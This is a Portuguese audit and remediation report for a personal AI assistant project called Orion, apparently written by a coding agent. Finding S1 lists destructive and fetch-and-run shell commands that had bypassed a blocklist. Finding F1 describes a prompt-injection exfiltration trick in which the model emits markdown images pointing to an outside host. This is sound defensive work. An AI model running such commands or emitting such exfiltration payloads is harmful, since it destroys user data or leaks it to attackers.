# ORION — Plano de melhorias e o que foi feito

> Auditoria de 02/10/2026 (backend, front, regras, docs) e a execução dela. Cada achado
> tem ID, evidência e status. O que **não** foi verificado está na última seção.
> Regras resultantes: [ORION_REGRAS.md](ORION_REGRAS.md). Plano de fases: [ORION_NUCLEO.md](ORION_NUCLEO.md).

## Achados e status

Legenda: ✅ resolvido e testado · 🟡 parcial · ⏳ depende de você ou de fase futura.

| ID | Sev. | Achado (evidência) | Status | Como |
|---|---|---|---|---|
| S1 | Alta | Câmara de Eco era blocklist de substring: `ri … -Recurse -Force`, `-r -fo`, `rmdir /s /q`, `-enc`, `[IO.Directory]::Delete`, `irm \| iex` saíam "baixo" | ✅ | Allowlist de leitura (`orion/policy/shell.py`); o legado delega a ela. `tests/policy/test_shell.py` tem os bypasses |
| S2 | Alta | Escrever no próprio código (`.py`, `.env` em `C:\Orion`) era "baixo risco" (lido do código) | ✅ | `PathGuard` protege a raiz do projeto; vale também para `gerar_documento` |
| B1 | Alta | Telegram devolvia o JSON cru do SSE (`{"tier":…}{"text":…}`) | ✅ | Parse correto + teste; o `/chat` novo é lido pelo mesmo bot sem mudança |
| S3 | Média | Hub `:8765` e `/ws/voice` aceitavam qualquer `Origin`; `/upload` sem limite | 🟡 | Origin conferido (testado com `websockets` real) e 25 MB. **Falta:** `/mcp` e o REST do legado seguem sem login até a fase 5 |
| S4 | Média | `buscar_url` sem bloqueio de IP local (SSRF para o REST do próprio Orion) | ✅ | `url_guard` (loopback, LAN, Tailscale, metadados, redirects). Limite: janela de DNS rebinding; o agente do `navegar_web` navega livre depois da 1ª página |
| S5 | Média | Confirmação por frase no chat, estado global, "turno seguinte" | ✅ (novo) | Aprovação fora de banda por (sessão, ferramenta, hash), 10 min, uso único. No legado a frase continua, mas o gate ficou mais forte |
| B2 | Média | Um histórico global para todos os canais | ✅ (novo) | Sessão ativa por canal. Legado inalterado (será apagado) |
| S6 | Baixa | ~45 SQL por f-string, 184 `except Exception`, audit engolia erro | 🟡 | Audit do legado não perde mais registro em silêncio; código novo parametrizado e sem `pass`. SQL do legado fica até a fase 3–4 |
| B3 | Baixa | "Diretiva Nº 2" citada onde não existe mais; ferramenta bloqueava nuvem | ✅ | Textos corrigidos; a aprovação do especialista é por ser agente com shell, não por ser nuvem |
| B4 | Baixa | Prompt com hardware/stack datados; persona em arquivo editável | ✅ | Legado limpo; `orion/persona.py` versionado, imutável, com teste contra fato que envelhece |
| E1 | Média | Sem CI nem testes unitários | ✅ | `.github/workflows/ci.yml` (Linux, Windows, macOS) + 270 testes Python + 18 em Node |
| E2 | Média | Só Windows, caminhos `C:\Orion` fixos, `requirements` com pywin32/torch | 🟡 | Pacote novo é portável (`platformdirs`, caminhos por config). Legado segue Windows por desenho até a fase 7 |
| E3 | Média | Globals, `ChatRouter` com 22 argumentos, `on_event` deprecado | ✅ (novo) | `create_app` com lifespan e `AppState` injetado |
| E4 | Baixa | `script.js` monolítico, `innerHTML` sem teste | ✅ | Front redesenhado em módulos (03/10/2026): 7 puros testados em Node (89 testes) + 77 testes de navegador (fluxos, segurança, mobile, axe). Ver [ORION_FRONT.md](ORION_FRONT.md) |
| E5 | Baixa | Drift de docs, `.gitignore`, `requirements` | 🟡 | Corrigidos. A pasta `Orion_Ollama/` **não** foi renomeada (o `.bat`, o boot e o README apontam para ela; sai na fase 7) |
| E6 | Média | RAG sem avaliação (HR 10%, MRR 0.057) | ✅ | `orion.memory.eval` + conjunto fixo em pytest; CLI para as **suas** perguntas reais |
| F1 | Média | *(achado durante a execução)* o chat renderizava `![x](https://host-qualquer/?d=…)` do modelo: exfiltração por prompt injection | ✅ | Só imagem de `/imagens/<arquivo>`; 18 testes em Node, com checagem de que falham no código antigo |

## O que foi construído (por fase do NUCLEO)

| Fase | Entrega | Status |
|---|---|---|
| 0 — exportar dados | Sem código: a ferramenta `backup_memoria` do legado já grava o formato que o importador lê | ⏳ **sua** (PC, `.env`, `google_auth/`, vault) |
| 1 — fundação | `pyproject` (uv, ruff, pyright, pytest), `orion.config`, logging JSON, `/health`, CLI, CI Win+macOS | ✅ (CI remoto ainda não rodou) |
| 2 — cérebro | `orion.gateway` (API OpenAI-compat., streaming, fallback, quarentena em 429), `orion.agent` (persona + memória + ferramentas sob política), `orion.delegate` (claude/codex/gemini), `POST /chat` | ✅ com gateway e CLIs **falsos**; ⏳ OmniRoute e CLIs reais |
| 3 — memória | SQLite + FTS5 + vetores (numpy) com RRF, fatos editáveis, vault, backup/restore, eval, **importador do export** | ✅ |
| 4 — ferramentas | Política (classes de risco, aprovações, taint, audit) e ferramentas de memória/`delegar` | 🟡 faltam servidores MCP e `orion-desktop` |
| 5 — canais | `/approvals` com token; Telegram, login e Tailscale **não** | ⏳ |
| 6 — interface/voz | Só `md.js` + teste | ⏳ |
| 7 — limpeza | Nada apagado: o legado ainda é a única coisa rodando com seus dados | ⏳ |

## Decisões que tomei por você (reverta se discordar)

1. **Loop de agente próprio, não PydanticAI** (decisão #3, alternativa). O fluxo de aprovação precisa
   controlar quando cada ferramenta roda e eu não tinha como validar PydanticAI contra um modelo real aqui.
2. **`executar_comando` sempre confirma**, salvo leitura provada (assumi seu "pode executar tudo" como aceite
   da recomendação que eu tinha dado).
3. **Pacote `orion/` na raiz**, ao lado do legado.
4. **Ring 0 #4 (Hardware-Bound) não foi alterado.** Deixei a proposta em ORION_REGRAS.md.
5. O legado importa `orion.policy` (só stdlib) para não ter duas políticas. Se `orion/` sumir, o gate do
   legado quebra: é acoplamento transitório, some na fase 7.

## O que não foi verificado

- **Windows e macOS:** o primeiro CI remoto rodou e já pagou o investimento: no **macOS** o Python do `uv` vem sem
  `enable_load_extension`, o que inviabilizaria o `sqlite-vec` no MacBook (troquei por vetores em tabela comum + numpy);
  no **Windows** a saída de uma CLI em Python voltava com acento corrompido (cp1252 no pipe; o `Delegator` agora força UTF-8
  no filho). O que ainda não tem prova: o resultado do CI **depois** dessas correções (conferir o PR).
- **Legado em produção:** o gate novo foi testado com stubs, não com Qdrant/SurrealDB no ar. **Antes de usar no PC,
  suba o cérebro e faça um pedido que rode `executar_comando`** — agora ele vai pedir confirmação em quase tudo
  que não for leitura (esse é o comportamento desejado, mas muda o uso).
- **Modelos reais:** nenhum gateway real foi chamado; o formato é o da OpenAI (OmniRoute o fala), mas o primeiro
  teste ao vivo é seu.
- **Embeddings reais:** a busca vetorial foi testada com um embedder falso (sinônimos). Falta o cliente da API
  gratuita (Gemini) e medir com suas perguntas reais — o conjunto de avaliação existe para isso.
- **Front:** carrega no Chromium headless sem erro; não testei dentro do pywebview, nem acessibilidade, nem o grafo 3D.
- `/mcp`, CORS `null` e o REST do legado continuam sem login até a fase 5 (já documentado no README).

## Próximos passos (em ordem)

1. **Fase 0, agora:** `backup_memoria` no PC, copiar `.env` e `Orion_Core/google_auth/`, conferir o vault.
2. Rodar `uv sync && uv run pytest` na sua máquina e olhar o primeiro CI no GitHub (Windows/macOS).
3. `orion import-surreal <pasta-do-backup> --assistente Orion` e escrever 15–30 perguntas reais em
   `tests/eval_pessoal.local.json`; medir com `python -m orion.memory.eval`.
4. Subir o OmniRoute e testar `ORION_GATEWAY_URL`/`ORION_GATEWAY_MODEL` com `POST /chat`.
5. Fase 5: bot do Telegram novo (botões de aprovar/negar chamando `/approvals`), login, Tailscale.
6. Fase 4: servidores MCP (navegador, Google) e `orion-desktop`, cada ferramenta com classe em `orion/policy/classes.py`.

## Ideias que sobraram (valor/custo)

- Briefing matinal no Telegram (agenda + lembretes + tarefas abertas).
- Captura rápida: link, foto ou voz no Telegram vira nota no vault (o `index_vault` já indexa).
- Painel único: cota por provedor, aprovações pendentes, audit, uso das CLIs (os contadores já existem).
- Modo estudo UNIMAR: resumo de PDF de aula e exercícios de UML/Java, com perfil de contexto próprio.
- Roteamento por tipo de tarefa (barato/rápido vs. pesado) no lugar do regex de palavras-chave.
- Consolidação noturna da memória: extrair fatos das conversas (a tabela `facts` e o `add_fact` já esperam isso).
